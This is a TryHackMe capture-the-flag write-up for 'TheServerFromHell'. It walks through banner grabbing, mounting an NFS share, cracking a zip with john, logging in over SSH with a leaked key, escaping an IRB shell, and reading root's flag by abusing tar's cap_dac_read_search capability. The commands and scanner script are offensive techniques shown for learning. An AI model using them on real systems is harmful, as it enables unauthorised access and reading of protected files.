# TheServerFromHell TryHackMe WrieUp
### Machine IP = 10.114.188.201

----
Before starting, I noticed a hint on the CTF page.
|  
<img width="554" height="91" alt="Screenshot From 2026-02-22 15-55-23" src="https://github.com/user-attachments/assets/bfdfd2a1-9ccf-4f40-bb10-234c4a013732" />  
|  
Lets do it:
```bash
┌──(faridd㉿Ferid)-[~/Downloads/theserverfromhell]
└─$ nc -nv 10.114.188.201 1337
(UNKNOWN) [10.114.188.201] 1337 (?) open
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```
Hmm, we need to scan first 100 ports. In cybersecurity, Banner Grabbing is the process of collecting the "handshake" message sent by a service when you first connect to its port. These banners often reveal the service name, version, and OS.  
The "Trollface" (ASCII art) is stored as a welcome message on one of the first 100 ports. You need to "grab" the banner of every port to find it.
```bash
#!/bin/bash

read -p "Enter the IP address: " IP_ADDRESS

for PORT in {1..100}; do
  nc -nv $IP_ADDRESS $PORT
done
```
I used this script fo getting the sevret message. This script takes the IP address as an input, iterates from 1 to 100, and prints all the banners for the corresponding ports by executing the “nc -nv $IP_ADDRESS $PORT” command each time.:
|  
<img width="1494" height="1663" alt="Screenshot From 2026-02-22 16-03-41" src="https://github.com/user-attachments/assets/6e20fb5d-193f-4494-b395-6c2dd5e2d8e4" />   
|  
I learned that I need to connect this port. And there is another hint for us:
```bash
┌──(faridd㉿Ferid)-[~/Downloads/theserverfromhell]
└─$ nc -nv 10.114.188.201 12345
(UNKNOWN) [10.114.188.201] 12345 (?) open
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```
Hmmm, NFS service will help us to get shared folder into our terminal. Lets see what is this folder:
```bash
showmount -e 10.114.188.201
```
|  
<img width="696" height="141" alt="Screenshot From 2026-02-22 16-06-45" src="https://github.com/user-attachments/assets/1059bb3c-e277-4359-b2b7-0d5fb0330fef" />  
|  
I will open another terminal, mount this folder and read the content from there.
```bash
sudo mount -t nfs 10.114.188.201:/home/nfs . -o nolock
```
|  
<img width="824" height="206" alt="Screenshot From 2026-02-22 16-15-18" src="https://github.com/user-attachments/assets/e9b5a37f-b938-4fd2-8312-5bb1a86b6ebe" />  
|  
Now I got a backup.zip file. I have to unzip it to read the information but I faced a problem:
|  
<img width="876" height="598" alt="Screenshot From 2026-02-22 16-16-16" src="https://github.com/user-attachments/assets/21062870-26d1-4fa8-93d3-e9462195ad50" />  
|  
Since I mounted the shared directory, I cannot perform any operation on this shared file except to read. That is why I cannot find its password to unzip (by using john tool). So, I copied it into another folder like, ~/Downloads and work on there.  
```bash
┌──(faridd㉿Ferid)-[~/Downloads/theserverfromhell]
└─$ cp backup.zip ~/Downloads
cd ~Downloads
zip2john backup.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash
unzip backup.zip
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub
```
When I look at **"~/Downloads/home/hades/.ssh"** where the extracted files are located, I got the flag.txt from there. We have also an id_rsa file which will be helpful for us to connect the "hades" user via ssh. When I wanted to connect, I saw that ssh work on another port not 22.
|  
<img width="821" height="133" alt="Screenshot From 2026-02-22 16-27-06" src="https://github.com/user-attachments/assets/3c9adcea-dbcd-45bd-8f00-4da35458f263" />  
|  
Hmm, the hint.txt file gives me a port range like *"2500-4500"*. I needed to check all of these ports one by one but It would take for days so, I wrote a script which find the real SSH port among several fake ones. But how I can define that which of them is Original ssh port.  
Normally, the original ssh port looks like this: SSH-2.0-OpenSSH_<version>_<platform>. For example:
1. SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
2. SSH-2.0-OpenSSH_7.6p1 Debian-4ubuntu0.3
In this way I clarified my script. Lets look at it:
```bash
import socket
import threading

# We use a Lock to prevent multiple threads from printing at the same time and mixing the output
print_lock = threading.Lock()

def check_port(ip, port):
    try:
        # Socket creation
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2) # Increased timeout slightly for SSH to respond

        # Connection
        s.connect((ip, port))

        # Reading the banner
        # Some fake ports close the connection immediately, so we keep recv inside try
        banner = s.recv(1024).decode(errors='ignore').strip()

        # Checking for real OpenSSH banner
        # Fake ports often just say "OpenSSH", 
        # but real SSH also shows the version number (e.g., SSH-2.0-OpenSSH_8.2...)
        if "OpenSSH" in banner:
            with print_lock:
                print(f"\n[+] FOUND! Port: {port}")
                print(f"Banner message: {banner}")

        s.close()
    except:
        pass

target_ip = "MACHINE'S IP"
print(f"Scan starting: {target_ip} (2500-4500)...")

threads = []
for p in range(2500, 4501):
    t = threading.Thread(target=check_port, args=(target_ip, p))
    t.start()
    threads.append(t)

# Wait for all threads to complete
for t in threads:
    t.join()

print("\nScan complete.")
```
Do not forget to change IP address before using it. I get the response that 3333 port is original open ssh port.
|  
<img width="801" height="359" alt="Screenshot From 2026-02-22 16-40-03" src="https://github.com/user-attachments/assets/636d4ea7-6ff7-4c03-af9b-a13a1cea6bdd" />  
|  
```bash
ssh -i id_rsa -p 3333 hades@10.114.188.201
```
After this we saw something like this:
|  
<img width="801" height="396" alt="Screenshot From 2026-02-22 16-42-07" src="https://github.com/user-attachments/assets/bdf54c2c-00ce-4511-9e54-7447acd1cc81" />  
|  
This environment is called IRB (Interactive Ruby).   
It is an interactive shell for the Ruby programming language. Instead of a standard Linux terminal, you are currently inside a Ruby interpreter.   
Since Ruby can execute system commands, you can "break out" into a normal terminal using one of the following methods:
```bash
exec "/bin/bash"
# OR
system("/bin/bash")
```
Yeah, I got the bash shell and get the user.txt flag from there.

----
# Privilege Escalation
I cannot do sudo -l because i didn't have password of the hades user. I looked at SUID binaries but got nothing special to be root. In crontab, I also couldn't get any sensitive information. After a time, I decided to check getcap.
```bash
getcap / -r 2>/dev/null
```
I saw two important results:
1. /usr/bin/mtr-packet = cap_net_raw+ep
2. /bin/tar = cap_dac_read_search+ep
   
I discovered that /bin/tar has the cap_dac_read_search+ep capability assigned to it.
This specific capability allows the tar binary to bypass File Read/Search permissions, meaning it can read any file on the system, including those owned by root, regardless of the current user's restrictions.
To exploit this, I followed these steps:

    Preparation: I moved to the /tmp directory, where I had full write permissions.

    Archiving: I used tar to create an archive of the root flag:
    tar cvf data.tar /root/root.txt

    Extraction: I extracted the newly created archive in my current directory:
    tar xvf data.tar

    Retrieving the Flag: Since the extraction process creates a local copy of the file structure that I now own, I was able to read the flag successfully:
    cat /tmp/root/root.txt

















